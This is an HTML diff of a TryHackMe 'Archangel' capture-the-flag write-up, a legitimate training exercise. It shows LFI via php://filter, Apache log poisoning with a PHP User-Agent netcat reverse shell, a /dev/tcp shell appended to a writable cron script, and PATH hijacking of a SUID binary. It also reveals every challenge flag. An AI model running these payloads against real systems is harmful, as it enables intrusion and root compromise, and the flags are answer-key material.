@@ -23,7 +23,7 @@
     
     
       
-        <title>Summary write ups (easy difficulty) - Offense, Defense, and Everything Between</title>
+        <title>Archangel - Offense, Defense, and Everything Between</title>
       
     
     
@@ -71,6 +71,11 @@
     <label class="md-overlay" for="__drawer"></label>
     <div data-md-component="skip">
       
+        
+        <a href="#archangel" class="md-skip">
+          Skip to content
+        </a>
+      
     </div>
     <div data-md-component="announce">
       
@@ -102,7 +107,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Summary write ups (easy difficulty)
+              Archangel
             
           </span>
         </div>
@@ -607,6 +612,127 @@
   
   
   
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#description" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Description
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumeration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#port-scanning" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Port Scanning
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#http-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        HTTP Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#vulnerability-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Vulnerability Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#foothold" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Foothold
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Foothold">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#lfi-log-poisoning" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        LFI + Log Poisoning
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation-horizontal" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Privilege Escalation (Horizontal)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation-vertical" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Privilege Escalation (Vertical)
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
   
 </nav>
                   </div>
@@ -621,30 +747,329 @@
                 
                   
 
+  <nav class="md-tags" >
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:boot2root" class="md-tag">boot2root</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:burp-suite" class="md-tag">burp-suite</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:challenge" class="md-tag">challenge</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:easy" class="md-tag">easy</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:lfi" class="md-tag">lfi</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:linux" class="md-tag">linux</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:log-poisoning" class="md-tag">log-poisoning</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:offensive" class="md-tag">offensive</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:tryhackme" class="md-tag">tryhackme</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:web" class="md-tag">web</a>
+      
+    
+  </nav>
 
 
-  <h1>Summary write ups (easy difficulty)</h1>
 
+<h1 id="archangel">Archangel</h1>
+<p><img alt="Archangel logo" src="../logos/archangel_logo.png" /></p>
+<p><strong>Platform:</strong> TryHackMe<br />
+<strong>Type:</strong> Challenge<br />
+<strong>Difficulty:</strong> Easy<br />
+<strong>Link:</strong> <a href="https://tryhackme.com/room/archangel">Archangel</a>  </p>
+<h2 id="description">Description</h2>
+<p>"Boot2root, Web exploitation, Privilege escalation, LFI<br />
+A well known security solutions company seems to be doing some testing on their live machine. Best time to exploit it."</p>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="port-scanning">Port Scanning</h3>
+<div class="highlight"><pre><span></span><code>ports=$(nmap -p- --min-rate=1000 TARGET_IP_ADDRESS | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//)
+nmap -p$ports -A -T4 TARGET_IP_ADDRESS
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>Host is up (0.021s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c (RSA)
+|   256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA)
+|_  256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Wavefire
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|phone
+Running (JUST GUESSING): Linux 5.X|6.X|4.X (96%), Google Android 10.X|11.X|12.X (93%)
+OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:6 cpe:/o:linux:linux_kernel:4 cpe:/o:google:android:10 cpe:/o:google:android:11 cpe:/o:google:android:12 cpe:/o:linux:linux_kernel:5.4
+Aggressive OS guesses: Linux 5.14 - 6.8 (96%), Linux 4.15 - 5.19 (96%), Linux 4.15 (96%), Linux 5.4 - 5.15 (96%), Android 10 - 12 (Linux 4.14 - 4.19) (93%), Android 10 - 11 (Linux 4.9 - 4.14) (92%), Android 12 (Linux 5.4) (92%), Android 9 - 11 (Linux 4.9 - 4.14) (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 3 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div>
+<h3 id="http-enumeration">HTTP Enumeration</h3>
+<div class="highlight"><pre><span></span><code>ffuf -u http://TARGET_IP_ADDRESS/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -c
+gobuster dir -u TARGET_IP_ADDRESS -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,txt
+</code></pre></div>
+<p><strong>Notes</strong>  </p>
 <ul>
-<li><a href="../brooklyn_nine_nine/">Brooklyn Nine Nine</a>  </li>
-<li><a href="../smag_grotto/">Smag Grotto</a>  </li>
-<li><a href="../bounty_hunter/">Bounty Hunter</a>  </li>
-<li><a href="../easy_peasy/">Easy Peasy</a></li>
-<li><a href="../gamingserver/">GamingServer</a></li>
-<li><a href="../rootme/">RootMe</a></li>
-<li><a href="../poster/">Poster</a></li>
-<li><a href="../brute_it/">Brute It</a></li>
-<li><a href="../startup/">Startup</a></li>
-<li><a href="../chill_hack/">Chill Hack</a></li>
-<li><a href="../cyborg/">Cyborg</a></li>
-<li><a href="../archangel/">Archangel</a></li>
+<li>No <code>robots.txt</code> or <code>sitemap</code> files  </li>
+<li>Holding page - no meaningful content apart from a domain name  </li>
+<li>Nothing interesting in the source code  </li>
+<li><code>/flags</code> directory uncovered in <code>ffuf</code> scan results in a RickRoll video (official Rick Astley YT account)  </li>
 </ul>
+<details class="success">
+<summary>Find a different hostname</summary>
+<p>mafialive.thm</p>
+</details>
+<p><strong>Action(s)</strong><br />
+<img alt="✅" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/2705.svg" title=":white_check_mark:" /> Add "mafialive.thm" to <code>/etc/hosts</code></p>
+<p><strong>Notes</strong>  </p>
+<ul>
+<li>Navigating to hostname reveals flag</li>
+</ul>
+<details class="success">
+<summary>Find flag 1</summary>
+<p>thm{f0und_th3_r1ght_h0st_n4m3} </p>
+</details>
+<div class="highlight"><pre><span></span><code>ffuf -u http://TARGET_IP_ADDRESS/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -c
+gobuster dir -u TARGET_IP_ADDRESS -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,txt
+</code></pre></div>
+<p><strong>Notes</strong>  </p>
+<ul>
+<li><code>gobuster</code> scan reveals page in development; source code reveals ability to enumerate local files on web server</li>
+</ul>
+<details class="success">
+<summary>Look for a page under development</summary>
+<p><code>test.php</code></p>
+</details>
+<h3 id="vulnerability-enumeration">Vulnerability Enumeration</h3>
+<div class="highlight"><pre><span></span><code>searchsploit OpenSSH 7.6p1  # Only result: username enumeration
+searchsploit http 2.4.29    # Only result: DoS
+</code></pre></div>
+<h2 id="foothold">Foothold</h2>
+<p><strong>Action(s)</strong><br />
+<img alt="✅" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/2705.svg" title=":white_check_mark:" /> Test LFI payloads in query parameter<br />
+<em>Successful payload to view source code: <code>http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php</code></em>  </p>
+<details class="success">
+<summary>Find flag 2</summary>
+<p>thm{explo1t1ng_lf1}</p>
+</details>
+<p><strong>Action(s)</strong><br />
+<img alt="✅" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/2705.svg" title=":white_check_mark:" /> Use LFI to perform log poisoning with customised User-Agent<br />
+<em>Successful Burp request to inject log poisoning payload shown below</em></p>
+<h3 id="lfi-log-poisoning">LFI + Log Poisoning</h3>
+<div class="highlight"><pre><span></span><code># Burp Request
+GET /test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/.././.././.././../var/log/apache2/access.log HTTP/1.1
+
+Host: mafialive.thm
+
+User-Agent: &lt;?php exec(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ATTACKER_IP_ 1234 &gt;/tmp/f&#39;) ?&gt;
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate, br
+
+Connection: keep-alive
+
+Upgrade-Insecure-Requests: 1
+
+Priority: u=0, i
+
+# From attacker machine
+nc -lvnp 1234
+
+# In web browser
+http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/.././.././.././../var/log/apache2/access.log
+
+# On attacker machine
+$ python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
+
+www-data@ubuntu:/var/www/html/development_testing$ ls -al /home
+total 12
+drwxr-xr-x  3 root      root      4096 Nov 18  2020 .
+drwxr-xr-x 22 root      root      4096 Nov 16  2020 ..
+drwxr-xr-x  6 archangel archangel 4096 Nov 20  2020 archangel
+
+www-data@ubuntu:/var/www/html/development_testing$ ls -al /home/archangel
+total 44
+drwxr-xr-x 6 archangel archangel 4096 Nov 20  2020 .
+drwxr-xr-x 3 root      root      4096 Nov 18  2020 ..
+-rw-r--r-- 1 archangel archangel  220 Nov 18  2020 .bash_logout
+-rw-r--r-- 1 archangel archangel 3771 Nov 18  2020 .bashrc
+drwx------ 2 archangel archangel 4096 Nov 18  2020 .cache
+drwxrwxr-x 3 archangel archangel 4096 Nov 18  2020 .local
+-rw-r--r-- 1 archangel archangel  807 Nov 18  2020 .profile
+-rw-rw-r-- 1 archangel archangel   66 Nov 18  2020 .selected_editor
+drwxr-xr-x 2 archangel archangel 4096 Nov 18  2020 myfiles
+drwxrwx--- 2 archangel archangel 4096 Nov 19  2020 secret
+-rw-r--r-- 1 archangel archangel   26 Nov 19  2020 user.txt
+
+www-data@ubuntu:/var/www/html/development_testing$ cat /home/archangel/user.txt
+&lt;l/development_testing$ cat /home/archangel/user.txt
+</code></pre></div>
+<details class="success">
+<summary>Get a shell and find the user flag</summary>
+<p>thm{lf1_t0_rc3_1s_tr1cky}</p>
+</details>
+<h2 id="privilege-escalation-horizontal">Privilege Escalation (Horizontal)</h2>
+<div class="highlight"><pre><span></span><code>www-data@ubuntu:/var/www/html/development_testing$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don&#39;t have to run the `crontab&#39;
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+*/1 *   * * *   archangel /opt/helloworld.sh
+17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
+#
+
+www-data@ubuntu:/var/www/html/development_testing$ ls -al /opt/helloworld.sh
+-rwxrwxrwx 1 archangel archangel 66 Nov 20  2020 /opt/helloworld.sh
+
+www-data@ubuntu:/var/www/html/development_testing$ cat /opt/helloworld.sh
+#!/bin/bash
+echo &quot;hello world&quot; &gt;&gt; /opt/backupfiles/helloworld.txt
+
+www-data@ubuntu:/var/www/html/development_testing$ echo &#39;sh -i &gt;&amp; /dev/tcp/ATTACKER_IP_ADDRESS/4444 0&gt;&amp;1&#39; &gt;&gt; /opt/helloworld.sh
+
+# On attacker machine
+nc -lvnp 4444                     
+Listening on 0.0.0.0 4444
+Connection received on 10.128.144.230 56940
+sh: 0: can&#39;t access tty; job control turned off
+
+$ python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
+
+archangel@ubuntu:~$ pwd
+/home/archangel
+
+archangel@ubuntu:~$ ls -al secret
+total 32
+drwxrwx--- 2 archangel archangel  4096 Nov 19  2020 .
+drwxr-xr-x 6 archangel archangel  4096 Nov 20  2020 ..
+-rwsr-xr-x 1 root      root      16904 Nov 18  2020 backup
+-rw-r--r-- 1 root      root         49 Nov 19  2020 user2.txt
+
+archangel@ubuntu:~$ cat secret/user2.txt
+</code></pre></div>
+<details class="success">
+<summary>Get User 2 flag </summary>
+<p>thm{h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n}</p>
+</details>
+<h2 id="privilege-escalation-vertical">Privilege Escalation (Vertical)</h2>
+<p><strong>Notes</strong>  </p>
+<ul>
+<li><code>/home/archangel/secret</code> directory contains a SUID binary called <code>backup</code> owned by the <code>root</code> user</li>
+<li><code>backup</code> binary uses <code>cp</code> to copy files without specifying an exact path to the binary</li>
+</ul>
+<p><strong>Action(s)</strong><br />
+<img alt="✅" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/2705.svg" title=":white_check_mark:" /> Insert a writable directory into <code>$PATH</code><br />
+<img alt="✅" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/2705.svg" title=":white_check_mark:" /> Create custom <code>cp</code> binary that can create a shell (should run as <code>root</code> when <code>backup</code> binary executed)  </p>
+<div class="highlight"><pre><span></span><code>archangel@ubuntu:~$ PATH=/home/archangel:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+archangel@ubuntu:~$ touch cp
+
+archangel@ubuntu:~$ echo &#39;#!/bin/bash&#39; &gt; cp
+
+archangel@ubuntu:~$ echo &#39;sh -i &gt;&amp; /dev/tcp/ATTACKER_IP_ADDRESS/1337 0&gt;&amp;1&#39; &gt;&gt; cp
+
+archangel@ubuntu:~$  chmod +x cp
+
+# On attacker machine
+nc -lvnp 1337
+
+# On target machine
+archangel@ubuntu:~$ /home/archangel/secret/backup
+
+# On attacker machine
+$ ls -al /root
+total 28
+drwx------  4 root root 4096 Nov 20  2020 .
+drwxr-xr-x 22 root root 4096 Nov 16  2020 ..
+-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
+drwx------  2 root root 4096 Nov 18  2020 .cache
+drwxr-xr-x  3 root root 4096 Nov 16  2020 .local
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root   68 Nov 19  2020 root.txt
+$ cat /root/root.txt
+</code></pre></div>
+<details class="success">
+<summary>Root the machine and find the root flag</summary>
+<p>thm{p4th_v4r1abl3_expl01tat1ion_f0r_v3rt1c4l_pr1v1l3g3_3sc4ll4t10n}</p>
+</details>
+<p><strong>Tools Used</strong><br />
+<code>Burp Suite</code></p>
+<p><strong>Date completed:</strong> 15/05/26<br />
+<strong>Date published:</strong> 15/05/26</p>
 
 
 
 
 
 
+
+  
+  
 
 
 
